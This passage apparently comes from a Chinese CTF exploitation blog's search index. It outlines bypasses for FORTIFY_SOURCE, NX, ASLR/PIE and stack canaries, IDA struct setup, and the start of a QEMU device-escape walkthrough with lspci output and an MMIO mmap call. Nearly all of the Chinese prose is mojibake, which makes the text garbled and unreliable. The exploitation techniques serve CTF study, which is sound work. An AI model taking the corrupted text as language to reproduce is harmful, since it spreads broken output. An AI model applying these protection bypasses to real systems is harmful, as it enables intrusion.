¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿå—åˆ°é™åˆ¶ï¼š\n\n%nï¼Œ%3$xä¸å¯ç”¨(è·³è¿‡äº†1ï¼Œ2ä¸å¯ç”¨)\n\n%n$åªèƒ½ä»1å¼€å§‹æ‰å¯ä»¥ï¼š%1$x%2$xå¯ç”¨\n\n4.ç»•è¿‡æ–¹æ³•ï¼š\n\n(1)åˆ©ç”¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œç¯¡æ”¹_IO_FILEç»“æ„ä¸­çš„_IO_FLAGS2_FORTIFYä¸º0ï¼Œä»è€Œå…³é—­FORTIFY_SOURCEå¯¹%nçš„æ£€æŸ¥ã€‚ä¹‹åå†åˆ©ç”¨ä»»æ„åœ°å€å†™ï¼Œå°†nargsç¯¡æ”¹ä¸º0ï¼Œä»è€Œå…³é—­å¯¹%n$çš„æ£€æŸ¥ã€‚\n\nå…·ä½“è®ºæ–‡ï¼š\n\n[http://phrack.org/issues/67/9.html](http://phrack.org/issues/67/9.html(è¦æŒ‚)\n\nhttps://jackgrence.github.io/phrack-67-9/\n\nhttps://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html\n\néƒ½å¾—æŒ‚vpnæ‰èƒ½çœ‹\n\n \n\n \n\n \n\nä¸‰ã€NX:NX enabled (No execute bit)\n\n1.åŠŸèƒ½ï¼šå°†å†…å­˜é¡µä»¥æ•°æ®å’ŒæŒ‡ä»¤ä¸¤ç§æ–¹å¼è¿›è¡Œäº†åˆ†ç±»ã€‚è¢«æ ‡è®°ä¸ºæ•°æ®é¡µçš„å†…å­˜é¡µï¼ˆå¦‚æ ˆå’Œå †ï¼‰ä¸Šçš„æ•°æ®æ— æ³•è¢«å½“æˆæŒ‡ä»¤æ‰§è¡Œï¼Œå³æ²¡æœ‰Xå±æ€§ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´shellcodeå¤±æ•ˆã€‚é™¤äº†.textä¹‹å¤–ï¼Œå…¶ä½™æ®µï¼Œæ•°æ®(stackã€heapç­‰)éƒ½ä¸å¯æ‰§è¡Œã€‚\n\n2.è¡¨ç°å½¢å¼ï¼špwn checksecæ£€æŸ¥\n\n3.ç»•è¿‡æ–¹æ³•ï¼šROPã€Onegadgetã€ret2libcç­‰ç­‰\n\n \n\n \n\n \n\nå››ã€ASLR(Address Space Layout Randomization)å’ŒPIE(Position Independent Executable)\n\n1.åŠŸèƒ½ï¼šè¯¥æŠ€æœ¯æ˜¯ä¸€ä¸ªé’ˆå¯¹å †ã€æ ˆã€libcåœ°å€ã€ä»£ç æ®µï¼ˆ.textï¼‰ã€æ•°æ®æ®µï¼ˆ.dataï¼‰ã€æœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µï¼ˆ.bssï¼‰ç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ï¼Œæ¯æ¬¡åŠ è½½ç¨‹åºéƒ½ä¼šéšæœºåŒ–è¿™äº›åœ°å€ã€‚\n\n2.è¡¨ç°å½¢å¼ï¼šchecksecæ£€æŸ¥ï¼Œgdb-pedaä¸­è¾“å…¥aslrã€‚\n\n3.ä¸åŒï¼š\n\n(1)ASLRæ˜¯ç³»ç»Ÿå±‚é¢çš„åœ°å€éšæœºï¼Œé’ˆå¯¹æ ˆ(stack)ï¼ŒlibcåŠ è½½åœ°å€ï¼Œå †(heap)ï¼Œæ²¡åŠæ³•åœ¨ç¼–è¯‘æ—¶é€‰æ‹©æ˜¯å¦å¼€å¯ASLRï¼Œä¸åŒç³»ç»Ÿè®¾ç½®ä¸‹éƒ½ä¸ä¸€æ ·ï¼Œåªæœ‰åœ¨ç¨‹åºè·‘èµ·æ¥ï¼Œè¿œç¨‹è°ƒè¯•æ‰èƒ½çœ‹åˆ°éšæœºåŒ–ã€‚å¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥ï¼š\n\ncat /proc/sys/kernel/randomize_va_space\n\næŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„éšæœºåŒ–ç­‰çº§ï¼Œä¹Ÿå¯ä»¥æ‰“å¼€è¿™ä¸ªæ–‡ä»¶è¿›è¡Œä¿®æ”¹ç­‰çº§ã€‚å…±åˆ†ä¸º3ä¸ªç­‰çº§ï¼š\n\nA.0ï¼šå³å…³é—­ASLR\n\nB.1ï¼šéƒ¨åˆ†å¼€å¯ï¼ŒéšæœºåŒ–stackå’ŒlibcåŠ è½½åœ°å€ï¼Œä¸éšæœºåŒ–heap\n\nC.2ï¼šå®Œå…¨å¼€å¯ï¼ŒéšæœºåŒ–stackã€libcåŠ è½½åœ°å€ã€heap\n\nâ–²æ³¨ï¼š\n\nç”±äºæ˜¯ç³»ç»Ÿå±‚é¢çš„ï¼Œåšpwné¢˜æ—¶è‚¯å®šæ˜¯ä¸çŸ¥é“è¿œç¨‹çš„ç³»ç»Ÿç¯å¢ƒåˆ°åº•æœ‰æ²¡æœ‰å¼€å¯ASLRï¼Œä¸€èˆ¬éƒ½æ˜¯é»˜è®¤å¼€å¯ï¼Œä¸”éƒ½æ˜¯2ç­‰çº§ã€‚åšé¢˜åšåˆ°ç°åœ¨æ²¡è§è¿‡å“ªä¸ªé¢˜ç›®å‘Šè¯‰ä¸å¼€å¯ASLRçš„ã€‚å¦å¤–åœ¨gdb-pedaä¸­æŸ¥çœ‹aslréƒ½æ˜¯é»˜è®¤ä¸ºoffï¼Œå› ä¸ºgdbé»˜è®¤å…³é—­ASLRï¼Œå¯ä»¥åœ¨gdb-pedaä¸­è¾“å…¥aslr onæ¥æ‰“å¼€ASLRã€‚\n\n(2)PIEæ˜¯gccç¼–è¯‘åŠŸèƒ½æ—¶çš„é€‰é¡¹ï¼Œé’ˆå¯¹ä»£ç æ®µ(.text)ã€åˆå§‹åŒ–æ•°æ®æ®µ(.data)ã€æœªåˆå§‹åŒ–æ•°æ®æ®µ(.bss)çš„é˜²æŠ¤æŠ€æœ¯ã€‚å¼€å¯ä¹‹åï¼Œä»¥ä¸Šæåˆ°çš„éƒ½ä¼šéšæœºåŒ–ï¼ŒåŒæ ·ä¹Ÿæ˜¯è¿œç¨‹è°ƒè¯•è·‘èµ·æ¥æ‰èƒ½çœ‹åˆ°æ•ˆæœã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰å¼€å¯äº†ASLRä¹‹åï¼ŒPIEæ‰èƒ½è¢«æ­£å¸¸ä½¿ç”¨ã€‚\n\n4.ç»•è¿‡æ–¹æ³•ï¼š\n\n(1)åˆ©ç”¨vsyscallæˆ–è€…vdsoæ¥æ»‘è¿‡ä¸€æ®µæ ˆç©ºé—´ï¼Œä»è€Œå°†eipæŒªç§»åˆ°æ ˆåº•ä¸‹æ–¹æˆ‘ä»¬æƒ³è¦çš„åœ°å€å¤„ã€‚\n\n(2)åˆ©ç”¨æ ˆæº¢å‡ºå’Œæ‰“å°å‡½æ•°çš„å‚æ•°ï¼Œä¿®æ”¹åŠ«æŒrbpä½¿å¾—åˆ©ç”¨rbpå¯»å€çš„æ‰“å°å‡½æ•°çš„å‚æ•°æŒ‡å‘æ ˆä¸Šå…¶å®ƒä½ç½®ï¼Œé€šè¿‡çˆ†ç ´æ¥å¯»æ±‚æ³„éœ²Libcåœ°å€ã€‚\n\n(3)åˆ©ç”¨PIEæœºåˆ¶ï¼Œçˆ†ç ´å€’æ•°ç¬¬å››ä½å¯ä»¥è·³è½¬åˆ°åŒä¸€ä¸ªå†…å­˜é¡µä¸­çš„ä»»æ„å‡½æ•°ã€‚\n\n \n\n \n\n \n\näº”ã€Stack Canary/Stack cookies\n\n1.åŠŸèƒ½ï¼šå‡½æ•°é€€å‡ºæ—¶ï¼Œå°†ä¿å­˜åœ¨æ ˆrbp-0x08å¤„çš„canaryå’Œtcbhead_tç»“æ„ä½“ä¸­çš„stack_guardæ¥xoræ“ä½œï¼Œè‹¥æ£€æŸ¥åˆ°æ”¹å˜åˆ™ä»£è¡¨æ‰§è¡Œäº†æ ˆæº¢å‡ºæ¼æ´ï¼Œç¨‹åºè°ƒç”¨__stack_chk_failï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œå¹¶å´©æºƒã€‚\n\n2.è¡¨ç°å½¢å¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rax,fs:28h\nmov [rsp+28h+var_20], rax\n------------------------------------------------------\nmov rax, [rsp+28h+var_20]\nxor rax, fs:28h\ncall __stack_chk_fail\n------------------------------------------------------\nv_canary = __readfsqword(0x28u);\nreturn __readfsqword(0x28u) ^ v_canary;\n```\n\n3.ä¸åŒç±»å‹çš„canary:\n\n(1)Terminator canaries:\n\næœ€å¸¸è§çš„canaryï¼Œæœ«å°¾ä¸º\\x00ï¼Œä¿å­˜åœ¨rpb - 0x08çš„ä½ç½®ã€‚\n\n(2).Random canaries:\n\nåœ¨ç¨‹åºåˆå§‹åŒ–æ—¶éšæœºç”Ÿæˆï¼Œä¿å­˜åœ¨ä¸€ä¸ªç›¸å¯¹å®‰å…¨çš„ä½ç½®ã€‚é€šå¸¸ç”±/dev/urandomæ¥ç”Ÿæˆï¼Œæœ‰æ—¶ä¹Ÿä½¿ç”¨å½“å‰æ—¶é—´çš„å“ˆå¸Œå€¼ã€‚\n\n(3).Random XOR canaries:\n\né€šè¿‡ä¸€ä¸ªéšæœºæ•°å’Œå‡½æ•°æ ˆä¸­æ‰€æœ‰æ§åˆ¶ä¿¡æ¯ï¼Œè¿”å›åœ°å€ç­‰å¼‚æˆ–è¿ç®—å¾—åˆ°çš„ï¼Œè¿™æ ·å½“å‡½æ•°æ ˆä¸­çš„éšæœºæ•°æˆ–ä¸ä¹‹ç›¸å…³çš„æ§åˆ¶ä¿¡æ¯ï¼Œè¿”å›åœ°å€è¢«ä¿®æ”¹äº†ï¼Œéƒ½å¯ä»¥æ£€æµ‹åˆ°ã€‚\n\n2.ç»•è¿‡æ–¹æ³•ï¼š\n\n(1)æœ‰å¾ªç¯æ—¶ï¼Œ32æˆ–è€…64ä½ç¨‹åºä¸‹éƒ½å¯ä»¥é€å­—èŠ‚çˆ†ç ´ç»•è¿‡ã€‚\n\n(2)å¯é€šè¿‡printfå­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²(%p.%p.%p....)ã€‚\n\n(3)é€šè¿‡æ‰“å°æ ˆä¸Šæ•°æ®çš„æ‰“å°å‡½æ•°æ ˆæº¢å‡ºè¿ä¸Šcanaryæ³„éœ²å‡ºæ¥ã€‚\n\n(4)å½“ç¨‹åºè¯»å…¥flagè¿›å…¥å†…å­˜æ—¶ï¼Œåˆ©ç”¨å‡½æ•°__stack_chk_failï¼ŒåŠ ä¸Šè¶³å¤Ÿé•¿åº¦çš„æ ˆæº¢å‡ºè¦†ç›–argv[0]ä¸ºç¨‹åºä¸­ä¿å­˜flagçš„åœ°å€ã€‚è¿™æ ·å½“__stack_chk_failè¿è¡Œæ—¶å°±ä¼šæ‰“å°å‡ºargv[0]ä¸­åœ°å€ä¸Šå¯¹åº”çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagã€‚\n\n(5)ç”±pthreadåˆ›å»ºå‡ºæ¥çš„çº¿ç¨‹å‡½æ•°ä¸­å¦‚æœæœ‰è¶³å¤Ÿé•¿åº¦çš„æ ˆæº¢å‡ºï¼Œå¯ä»¥ç›´æ¥è¦†ç›–canaryæ¥æºtcbhead_tç»“æ„ä½“ä¸­çš„canaryå’Œæ ˆä¸­çš„canaryä¸ºåŒä¸€æ•°å€¼ï¼Œè¿™æ ·æ£€æŸ¥ä»æ—§é€šè¿‡ã€‚\n\n(64ä½ä¸­ä¸ºfs:[28h]ï¼Œ32ä½ä¸­ä¸ºgs:[14h])\n\nâ–²é•¿åº¦ä¸€èˆ¬ä¸ºrbp+2000å·¦å³ï¼Œä¸åŒçš„Libcç‰ˆæœ¬éƒ½ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦è°ƒè¯•æ‰èƒ½çŸ¥é“ã€‚åŸå› æ˜¯é€šè¿‡pthreadå‡ºæ¥çš„çº¿ç¨‹å‡½æ•°æ ˆä¼šè¢«å®‰ç½®åˆ°ä¸TLSç›¸å·®çº¦2000å­—èŠ‚çš„è·ç¦»å¤„ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519177.png)    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519553.png)\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€ä¸ªæ˜¯mainå‡½æ•°æ ˆï¼Œç¬¬äºŒä¸ªæ˜¯åœ¨mainå‡½æ•°ä¸­é€šè¿‡pthreadè¿›ç¨‹åˆ›å»ºå¹¶ä¸”è°ƒç”¨çš„å‡½æ•°æ ˆï¼Œä¸¤è€…ç›¸å·®å°†è¿‘0x700000000è¿™ä¹ˆè¿œï¼Œå®Œå…¨ä¸æ˜¯æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ç›¸å·®çš„æ ˆè·ç¦»ã€‚åŒæ—¶åœ¨è¯¥å‡½æ•°ä¸­rbpæŒ‡å‘çš„å§‹ç»ˆæ˜¯0000(å…¨æ˜¯)ï¼Œè¯¥å‡½æ•°ç»“æŸåä¼šå…ˆè·³è½¬åˆ°libcä¸­çš„libpthreadæ¥æ¢å¤æ ˆã€‚\n\nâ–²64ä½çš„tcbhead_tç»“æ„ä½“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ntypedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n               thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;//å³ä¸ºcanaryï¼Œfs:28hå¤„\n  uintptr_t pointer_guard;\n  ...\n} tcbhead_t;\n```\n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN","pwn-Knowledge"]},{"title":"pwnå †-IDA-0x01","url":"/2021/08/14/pwnå †-IDA-0x01/","content":"\nâ–²å †é¢˜ä¸€èˆ¬éƒ½éœ€è¦è®¾ç½®ä¸‹IDAä¸­çš„ç»“æ„ä½“ï¼š\n\n1.ç»“æ„ä½“è®¾ç½®ï¼šæ‰“å¼€IDA-çª—å£-ç»“æ„ä½“(alt+4)ã€‚\n\n2.ç¼–è¾‘-æ·»åŠ ç»“æ„ä½“ç±»å‹ï¼Œç„¶åå†™åç§°(insert)ã€‚\n\n3.å‡ºç°æ–°å¢çš„structä¹‹åï¼Œå°†é¼ æ ‡æ”¾åœ¨è¯¥ç»“æ„ä½“endsä½ç½®ï¼ŒæŒ‰dæ·»åŠ æˆå‘˜ã€‚\n\n4.å°†é¼ æ ‡æ”¾åœ¨æˆå‘˜ä¸Šï¼ŒæŒ‰dè½®è½¬è®¾ç½®æˆå‘˜å¤§å°ï¼ŒæŒ‰uå¯åˆ é™¤æˆå‘˜ã€‚\n\n5.æ‰¾åˆ°mallocçš„ä½ç½®ï¼Œåˆ¤æ–­å¥½å“ªä¸ªå˜é‡æ˜¯å­˜æ”¾chunkå’Œchunk_sizeï¼Œä¹‹åæŒ‰yå°†å…¶è®¾ç½®ä¸º:\n\nstruct struct_Name *array_Name[count]\n\n(ä¸€èˆ¬éƒ½æ˜¯è¿™æ ·çš„ï¼Œé¢˜ç›®ä¼šåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç»“æ„ä½“é‡Œæœ‰ä¸¤ä¸ªæ•°æ®æˆå‘˜ï¼Œä¸ºchunkå’Œchunk_sizeï¼Œè¿™é‡Œçš„chunkå°±æ˜¯Mallocè¿”å›çš„æŒ‡é’ˆã€‚ä¸åŒé¢˜ç›®å…·ä½“åˆ†æï¼Œæœ‰çš„ä¹Ÿæœ‰å‡½æ•°æŒ‡é’ˆçš„æ•°æ®æˆå‘˜void * fun_Name())\n\n6.è®¾ç½®å¢åˆ æ”¹æŸ¥å‡½æ•°çš„å˜é‡ç±»å‹ä¸ºvoidï¼Œä¸ç„¶ifå‡½æ•°å°±æœ‰çš„éš¾å—äº†ã€‚\n\n7.å°†åˆ¤æ–­çš„æˆå‘˜å˜é‡ä»€ä¹ˆçš„éƒ½è®¾ç½®å¥½ï¼ŒæŒ‰Næ”¹åï¼Œä¹‹åå†æ¥åˆ†ææ¼æ´ï¼Œä¸ç„¶å¾ˆå®¹æ˜“æ··æ·†ã€‚\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://blog.csdn.net/hgy413/category_1151311.html\n","tags":["IDA"],"categories":["PWN","pwnå †-IDA"]},{"title":"qemué€ƒé€¸-pwnè§£é¢˜","url":"/2021/08/14/qemué€ƒé€¸-pwnè§£é¢˜/","content":"\nä¸€ã€å†…å­˜æ¨¡å—ï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507619.jpeg)\n\n1.å¯ä»¥çœ‹åˆ°åœ¨å®é™…ç‰©ç†å†…å­˜physical memoryä¸­å­˜åœ¨qemuè¿›ç¨‹çš„å†…å­˜ç©ºé—´\n\n2.ä¹‹ååœ¨qemuè¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­è™šæ‹ŸåŒ–å‡ºè™šæ‹Ÿä¸»æœºçš„å®é™…å†…å­˜ç©ºé—´Guest's phy memoryã€‚\n\n3.ç„¶åæ‰æ˜¯è™šæ‹Ÿä¸»æœºä¸­å„ä¸ªè¿›ç¨‹çš„å†…å­˜åˆ†é…ã€‚\n\nâ–²è¿™é‡Œå¯ä»¥çœ‹åˆ°è™šæ‹Ÿæœºä¸­çš„è¿›ç¨‹åœ°å€éƒ½åœ¨å®é™…å†…å­˜åœ°å€ä¸­æœ‰æ˜ å°„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°åœ¨è™šæ‹Ÿä¸»æœºä¸­çš„æŸä¸ªè¿›ç¨‹å¯¹åº”çš„å®é™…å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆä¸€æ—¦æ»¡è¶³ä¸€å®šæƒé™è¦æ±‚å°±å¯ä»¥æ‰§è¡Œå®é™…å†…å­˜ä¸­qemuè¿›ç¨‹åŠ è½½çš„libcä¸­çš„å†…å®¹ï¼Œä»è€Œè°ƒç”¨å®é™…å†…å­˜ä¸­çš„systemå‘½ä»¤ï¼Œå®ç°qemué€ƒé€¸ã€‚\n\n \n\näºŒã€é€ƒé€¸çªç ´å£ï¼š\n\nâ–²qemué€ƒé€¸ä¸€èˆ¬æ˜¯ä»qemuè™šæ‹ŸåŒ–è®¾å¤‡çš„ä»£ç ä¸­å¯»æ‰¾æ¼æ´ï¼Œä½†æ˜¯qemuä¼šè™šæ‹ŸåŒ–å¾ˆå¤šè®¾å¤‡ï¼Œåœ¨ctfä¸­ä¸€èˆ¬éœ€è¦å…³æ³¨çš„å°±æ˜¯é¢˜ç›®ç»™çš„PCIè®¾å¤‡ã€‚åŸºæœ¬ä¸Šéƒ½æ˜¯æŠŠqemu-system-x86ç”¨IDAæ‰“å¼€ï¼Œç„¶åä»å’Œè¯¥è®¾å¤‡äº¤äº’çš„å‡½æ•°ä¸­å¯»æ‰¾æ¼æ´ã€‚\n\nä¾‹å¦‚åˆ†æé¢˜ç›®åçŸ¥é“äº†æŸä¸ªè®¾å¤‡å¯èƒ½å°±æ˜¯æ¼æ´è®¾å¤‡ï¼Œè¿™é‡Œä»¥BlizzardCTF2017-Strngé¢˜ç›®ä¸ºä¾‹ï¼ŒåŠ è½½äº†strngè®¾å¤‡ï¼Œé‚£ä¹ˆå°±ç”¨IDAæ‰“å¼€qemu-system-x86ï¼Œç„¶ååœ¨å‡½æ•°åˆ—è¡¨æœç´¢strngï¼Œæ‰¾åˆ°å¯¹åº”å‡½æ•°è¿›è¡Œåˆ†æã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507124.png)\n\nå¯»æ‰¾æ¼æ´å°±éœ€è¦æ›´å¤šçš„å‰ç½®çŸ¥è¯†äº†ï¼š\n\n1.å¯»æ‰¾åˆ°è®¾å¤‡çš„ä»£å·ï¼Œæ–¹ä¾¿æŸ¥çœ‹å…¶è®¾å¤‡åœ°å€ç©ºé—´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nubuntu@ubuntu:~$ lspci\n00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)\n00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]\n00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]\n00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)\n00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)\n00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)\n00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)\n```\n\n \n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)ï¼Œä¸€èˆ¬æ ‡è®°ä¸ºunclassified deviceå°±æ˜¯qemuå¯åŠ¨æ—¶çš„å‘½ä»¤å‚æ•°ä¸­åŠ è½½è¿›å…¥çš„è®¾å¤‡ï¼Œä¹Ÿå°±æ˜¯strngè®¾å¤‡ã€‚é‚£ä¹ˆå…¶å¯¹åº”çš„ä»£å·å°±æ˜¯00:03.0ï¼Œä¹‹åé€šè¿‡è¿™ä¸ªä»£å·æŸ¥è¯¢æ›´å¤šå†…å®¹ã€‚\n\n2.æŸ¥çœ‹PCIè®¾å¤‡çš„åœ°å€ç©ºé—´ï¼Œä»è€Œæ–¹ä¾¿æ¨æ–­å‡ºè®¾å¤‡å®é™…ç”³è¯·çš„å†…å­˜åœ°å€ï¼š\n\n(1)é€šè¿‡è®¾å¤‡ä»£å·ï¼Œæ‰¾åˆ°è¯¥è®¾å¤‡çš„åœ°å€ç©ºé—´ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nlspci -v -m -n -s 00:03.0\n-------------------------------------------------------------------------\nlspci -v -m -s 00:03.0\n-----------------------------------------------------------------------\nlspci -v -s 00:03.0 -x\n------------------------------------------------------------------------\nhexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config\n```\n\n(2)é€šè¿‡åœ°å€ç©ºé—´æ‰¾åˆ°è¯¥è®¾å¤‡ç”³è¯·çš„å†…å­˜ç©ºé—´ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507195.png)\n\n```\n#æ³¨é‡Šå¤´\n\nubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config\n0000000 1234 11e9 0103 0000 0010 00ff 0000 0000\n0000010 1000 febf c051 0000 0000 0000 0000 0000\n0000020 0000 0000 0000 0000 0000 0000 1af4 1100\n0000030 0000 0000 0000 0000 0000 0000 0000 0000\n```\n\n \n\nè¿™é‡Œé€šè¿‡å¯¹ç…§ï¼Œå¯ä»¥çŸ¥é“ä»¥ä¸Šå„ä¸ªå‚æ•°çš„å®é™…å†…å®¹ã€‚\n\n(3)ç„¶åå¯»æ‰¾mmioå’Œpmioçš„åœ°å€ï¼Œè¿™ä¸¤ä¸ªæ˜¯PCIè®¾å¤‡ä¸ºäº†ä¸qemuè™šæ‹Ÿæœºè¿›è¡ŒI/Oç”³è¯·æ‰€æ˜ å°„çš„ä¸¤å—å†…å­˜ã€‚ç”±äºqemuæ¨¡æ‹Ÿè®¾å¤‡æœ€ç»ˆéƒ½ä¼šä¸çœŸå®çš„è®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œè€Œqemuä¸­çš„mmioå°±æ˜¯ç›¸å¯¹äºä¸»æœºä¸‹çš„mmioçš„ä¸€æ®µæ˜ å°„ï¼Œæ‰€ä»¥è®¿é—®è¿™æ®µç©ºé—´å°±ç›¸å½“äºè®¿é—®ä¸»æœºä¸‹çš„mmioç©ºé—´ï¼Œé‚£ä¹ˆå°±èƒ½è·³å‡ºqemuï¼Œå®ç°qemué€ƒé€¸ã€‚è€ŒPCIè®¾å¤‡çš„å¤§å¤šçš„è¯»å†™æ“ä½œéƒ½åœ¨è¿™ä¸¤å—å†…å­˜ä¸Šï¼Œæ‰€ä»¥é’ˆå¯¹è¿™ä¸¤å—å†…å­˜çš„æ“ä½œå‡½æ•°é€šå¸¸ä¹Ÿæ˜¯æœ€å®¹æ˜“å‡ºç°æ¼æ´çš„åœ°æ–¹ã€‚\n\nâ‘ mmio:ä¸å†…å­˜å…±äº«ä¸€å—åœ°å€ç©ºé—´ï¼Œå…±ç”¨ä¸€å®šæ•°é‡çš„åœ°å€æ€»çº¿ï¼Œcpuå¯¹è¯¥åœ°å€ç©ºé—´çš„è®¿é—®ä¼šç›´æ¥è½¬åŒ–ä¸ºå¯¹è®¾å¤‡çš„è®¿é—®ã€‚\n\nâ‘¡pmio:ä¸å†…å­˜åˆ†å¼€çš„ï¼Œæ‰€ç”¨çš„åœ°å€æ€»çº¿å’Œå†…å­˜æ‰€ç”¨çš„åœ°å€æ€»çº¿ä¸æ˜¯ä¸€æ ·çš„ï¼Œcpuè®¿é—®è¿™å—å†…å­˜æ—¶éœ€è¦ä½¿ç”¨ç‰¹æ®Šçš„æŒ‡ä»¤è¿›è¡Œè®¿é—®ã€‚\n\nè¿™ä¸¤å—å†…å­˜æ˜¯åœ¨BAR(base address register)ä¸­ï¼ŒBARæ€»å…±6ä¸ªregisterï¼ŒBAR0ï¼ŒBAR1...ï¼Œæ¯ä¸ªBARå æ®4ä¸ªå­—èŠ‚ã€‚è€Œmmioå¯¹åº”BAR0ï¼Œpmioå¯¹åº”BAR1ã€‚\n\nâ–²ç»“åˆä¸Šå›¾å¯ä»¥çœ‹åˆ°mmioçš„åœ°å€ä¸º0xfebf1000ï¼Œpmioåœ°å€ä¸º0xc051ã€‚\n\n3.æŸ¥çœ‹PCIè®¾å¤‡åˆå§‹åŒ–çš„å‡½æ•°ï¼Œå¯»æ‰¾æ¼æ´ï¼š\n\n(1)é¦–å…ˆæŸ¥çœ‹æ³¨å†Œstrngè®¾å¤‡çš„å‡½æ•°ï¼šè¿™é‡Œåˆ†æå¯ä»¥çŸ¥é“strng_class_initå³ä¸ºåˆå§‹åŒ–å‡½æ•°ï¼š\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507927.jpeg)\n\nobject_class_dynamic_cast_assertå‡½æ•°å³åˆ›å»ºäº†ä¸€ä¸ªè®¾å¤‡ï¼Œåé¢çš„ä¸€äº›æ“ä½œéƒ½æ˜¯èµ‹å€¼è¯­å¥ï¼Œä¸ºäº†åˆå§‹åŒ–è¯¥è®¾å¤‡ã€‚\n\n(2)ç„¶åæŸ¥çœ‹strng_instance_initå‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯ä¸ºäº†å®ä¾‹åŒ–è®¾å¤‡ï¼Œåˆå§‹åŒ–è®¾å¤‡çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“å¯ä»¥åœ¨IDAä¸­çœ‹åˆ°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507761.jpeg)\n\nå‡½æ•°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507924.jpeg)\n\nè¿™æ ·å¯ä»¥çœ‹åˆ°åˆ›å»ºäº†mmioå’Œpmioç©ºé—´ï¼Œå¤§å°åˆ†åˆ«ä¸º0x100å’Œ0x8ã€‚\n\n(3)ç°åœ¨æŸ¥çœ‹å¯¹è¿™ä¸¤ä¸ªç©ºé—´çš„æ“ä½œå‡½æ•°ï¼Œè¿™æ‰æ˜¯é‡ç‚¹ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™é“é¢˜ç›®ä¸­è°ƒç”¨å¯¹mmioå’Œpmioè¿›è¡Œè¯»å†™æ“ä½œçš„å‡½æ•°æ—¶ï¼Œå¹¶æ²¡æœ‰å¯¹mmioæˆ–è€…pmioç©ºé—´è¿›è¡Œè¯»å†™æ“ä½œï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å¯¹regæ•°ç»„è¿›è¡Œè¯»å†™æ“ä½œã€‚\n\nâ–²åŸå› æ˜¯ä»¥ä¸‹ç»“æ„ä½“çš„å®šä¹‰ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\ntypedef struct {\n    PCIDevice pdev;\n    MemoryRegion mmio; //mmioå†…å­˜ç©ºé—´\n    ......\n} STRNGState;\n\nstatic const MemoryRegionOps strng_mmio_ops = { //mmioç©ºé—´å¯¹åº”çš„æ“ä½œ\n    .read = strng_mmio_read, //å¯¹mmioç©ºé—´çš„readç”±strng_mmio_readå®ç°\n    .write = strng_mmio_write, //å¯¹mmioç©ºé—´çš„writeç”±strng_mmio_writeå®ç°\n    .endianness = DEVICE_NATIVE_ENDIAN,\n};\n```\n\nåŸæœ¬åœ¨cè¯­è¨€ä¸­expçš„æ¥å£å‡½æ•°ä¸­ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n-----------------------------------------------------------------------------\n*((uint32_t*)(mmio_mem + addr)) = 